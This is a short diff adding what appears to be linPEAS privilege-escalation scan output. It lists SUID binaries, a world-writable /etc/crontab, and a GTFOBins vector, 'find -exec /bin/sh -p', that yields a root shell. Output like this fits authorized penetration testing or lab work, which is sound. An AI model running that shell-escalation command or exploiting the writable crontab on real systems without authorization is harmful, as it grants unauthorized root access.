@@ -1,0 +1,12 @@
+========================================================================
+                      linPEAS - Linux Privilege Escalation
+========================================================================
+[+] SUID binaries found:
+-rwsr-xr-x 1 root root 163840 Jul 18 10:00 /usr/bin/find
+-rwsr-xr-x 1 root root 84520  Jul 18 10:00 /usr/bin/newgrp
+
+[+] Writable configuration files:
+-rw-rw-rw- 1 root root 1024 Jul 18 10:05 /etc/crontab
+
+[+] GTFOBins Privilege Escalation Vectors:
+/usr/bin/find -exec /bin/sh -p \; -quit
